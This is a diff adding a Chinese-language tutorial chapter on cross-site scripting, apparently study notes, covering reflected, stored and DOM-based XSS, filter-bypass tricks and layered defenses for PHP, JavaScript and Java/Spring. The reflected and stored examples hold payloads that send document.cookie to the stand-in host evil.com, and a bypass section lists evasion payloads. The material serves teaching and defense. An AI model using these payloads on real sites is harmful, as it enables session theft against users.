@@ -100,3 +100,208 @@ XSS的危害同样是阶梯式的——弹窗只是最基本的验证手段，�
 需要特别注意：XSS在OWASP Top 10中长期位列前五。与SQL注入不同——SQL注入攻击的是**服务端数据库**，XSS攻击的是**客户端/用户**。但正因为它面向用户，在钓鱼、社工、蠕虫传播等场景中危害极大。
 
 ---
+
+## 第二章：常见攻击手法与防护
+
+### 2.1 三种类型的攻击实战
+
+#### 反射型XSS
+
+构造恶意链接诱导受害者点击是最常见的利用方式：
+
+```html
+<!-- 搜索框反射型XSS -->
+http://target.com/search?q=<script>document.location='http://evil.com/steal?c='+document.cookie</script>
+
+<!-- 经过URL编码后更具欺骗性 -->
+http://target.com/search?q=%3Cscript%3E...%3C%2Fscript%3E
+```
+
+攻击者通常配合短网址服务或钓鱼邮件发送编码后的链接。
+
+#### 存储型XSS
+
+评论区、留言板、用户资料页是最常见的存储型XSS入口：
+
+```html
+<!-- 在评论区提交 -->
+评论内容：<script>
+  var img = new Image();
+  img.src = 'http://evil.com/steal?cookie=' + encodeURIComponent(document.cookie);
+</script>
+
+<!-- 之后每个访问该页面的用户Cookie都会被发送到攻击者服务器 -->
+```
+
+存储在数据库中的恶意脚本被反复读取输出，**这是危害最大的XSS形式**。
+
+#### DOM型XSS
+
+纯前端漏洞，攻击面包括 `location.hash`、`document.referrer`、`postMessage` 等：
+
+```html
+<!-- 页面上的JS代码 -->
+<script>
+  var url = location.hash.substring(1);
+  document.getElementById("content").innerHTML = url;
+</script>
+
+<!-- 攻击 -->
+http://target.com/page#<img/src=x/onerror=alert(1)>
+```
+
+`innerHTML`、`document.write()`、`eval()` 都是DOM型XSS的高风险API。
+
+### 2.2 常见绕过技巧
+
+XSS的绕过本质上是**和过滤规则的对抗**。下面是最常见的四类绕过手法：
+
+#### 大小写绕过
+
+```html
+<!-- 过滤了小写 on 开头的事件 -->
+<input value="" onclick=alert(1)>     <!-- 被拦截 -->
+
+<!-- 改用大写 -->
+<input value="" Onclick=alert(1)>     <!-- 某些过滤规则区分大小写，成功绕过 -->
+<input value="" ONCLICK=alert(1)>     <!-- 全大写同样可行 -->
+```
+
+> XSS-labs Level 6/7 都会遇到此情况，记住 `On` 就是最简单有效的绕过。
+
+#### 双写绕过
+
+```html
+<!-- 过滤了 script 关键字（替换为空） -->
+<script>alert(1)</script>             <!-- 被替换为空 -->
+
+<!-- 双写绕过 -->
+<scrscriptipt>alert(1)</scrscriptipt>
+<!-- 过滤掉中间的 script 后，外层拼在一起恢复为 <script> 和 </script> -->
+```
+
+#### 编码绕过
+
+这是最需要掌握的一类绕过，涉及三种编码体系：
+
+| 编码类型 | 语法 | 示例 |
+|----------|------|------|
+| HTML实体编码 | `&#ASCII码;` | `&#106;` → `j` |
+| URL编码 | `%十六进制` | `%3C` → `<` |
+| JS Unicode编码 | `\xHH` 或 `\uHHHH` | `\x3c` → `<` |
+
+```html
+<!-- 过滤 script 关键字 → 改用 HTML 实体编码 -->
+<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)">click</a>
+<!-- 浏览器解析后等价于：javascript:alert(1) -->
+
+<!-- URL中的 < 和 > 被编码 -->
+%3Cscript%3Ealert(1)%3C/script%3E
+```
+
+#### 替代语法绕过
+
+```html
+<!-- 空格被过滤 → 用 / 替代 -->
+<img/src=x/onerror=alert(1)>          <!-- 正常语法：<img src=x onerror=...> -->
+<!-- / 在HTML标签中可以作为属性分隔符 -->
+
+<!-- on 事件被过滤 → 用其他事件 -->
+<svg/onload=alert(1)>                 <!-- SVG标签的onload事件 -->
+<body onload=alert(1)>                <!-- body的onload事件 -->
+<input onfocus=alert(1) autofocus>    <!-- onfocus + 自动聚焦 -->
+```
+
+### 2.3 防护方法
+
+XSS防护是**三层防线**：输出编码是根本，CSP+HttpOnly削减危害，XSS Filter做最终兜底。
+
+#### 第一层：输出编码（根本）
+
+根据**输出上下文**选择不同的编码方式，这是XSS防护的黄金法则：
+
+| 输出上下文 | 编码方式 | 示例 |
+|-----------|----------|------|
+| HTML文本内容 | HTML实体编码 | `<` → `&lt;` `>` → `&gt;` |
+| HTML属性值 | HTML实体编码 + 引号 | 始终用双引号包裹属性值 |
+| JavaScript中 | `\xHH` 或 JSON.stringify | 避免将用户输入直接拼入 `<script>` |
+| URL中 | URL编码 | `encodeURIComponent()` |
+| CSS中 | CSS编码 | 避免将用户输入用于CSS |
+
+```php
+// PHP：根据上下文选择编码函数
+echo htmlspecialchars($keyword, ENT_QUOTES, 'UTF-8');        // HTML文本
+echo json_encode($data, JSON_HEX_TAG | JSON_HEX_AMP);        // JS中
+```
+
+```javascript
+// 前端：textContent 替代 innerHTML（最安全的实践）
+element.textContent = userInput;         // 安全 — 不会解析HTML标签
+element.innerHTML = userInput;           // 危险 — 会解析HTML标签
+
+// 如果必须使用 innerHTML，先用 DOMPurify 清洗
+element.innerHTML = DOMPurify.sanitize(userInput);
+```
+
+#### 第二层：架构层防护（削减攻击面）
+
+**HttpOnly Cookie** — 让JS无法读取Cookie，即使XSS成功也偷不走会话令牌：
+
+```
+Set-Cookie: sessionid=abc123; HttpOnly; Secure; SameSite=Strict
+```
+
+**CSP（Content Security Policy）** — 白名单限制可执行的脚本来源：
+
+```http
+Content-Security-Policy: script-src 'self'; object-src 'none'; base-uri 'self'
+```
+
+这条CSP规则的含义：只允许从同源加载脚本，禁止 `<object>` 标签，限制 `<base>` 标签。
+
+CSP无法防止XSS发生，但能极大削减XSS成功后的利用空间。配合 `report-uri` 还能实现攻击监控。
+
+#### 第三层：流程层防护（兜底）
+
+- **安全扫描**：将 OWASP ZAP 等工具集成到CI/CD，每次上线前自动化扫描
+- **代码审计关键词**：搜索 `innerHTML`、`document.write()`、`eval()`、`.html()`
+- **前端安全规范**：团队统一使用 `textContent`、避免直接操作HTML字符串
+
+### 2.4 Java / Spring Boot 防护要点
+
+作为Java后端开发者，以下防护机制需要熟悉：
+
+**Thymeleaf 模板引擎**：默认使用 `th:text` 进行HTML实体编码，无需额外处理：
+
+```html
+<!-- 安全：th:text 自动转义 -->
+<p th:text="${userInput}"></p>
+
+<!-- 危险：th:utext 不转义，仅在确保数据安全时使用 -->
+<p th:utext="${trustedHtml}"></p>
+```
+
+**JSP**：使用 `<c:out>` 标签自动转义，或使用 `fn:escapeXml()` 函数：
+
+```jsp
+<%-- 安全 --%>
+<c:out value="${userInput}" />
+
+<%-- 危险 — 不要这样写 --%>
+<%= request.getParameter("q") %>
+```
+
+**Spring Boot 全局防护**：可配置 `X-XSS-Protection` 响应头、集成 `Jsoup` 白名单清洗：
+
+```java
+// 使用 Jsoup 白名单清洗用户输入的HTML
+String safe = Jsoup.clean(userInput, Whitelist.basic());
+```
+
+| 防护层级 | 一句话要点 |
+|----------|-----------|
+| 输出编码 | 根据上下文选编码方式，htmlspecialchars / textContent / th:text |
+| CSP + HttpOnly | 就算XSS成功，偷不走Cookie，调不了外部脚本 |
+| 规范+审计 | 代码会变，扫描要持续跑，innerHTML 是最大的红旗 |
+
+---
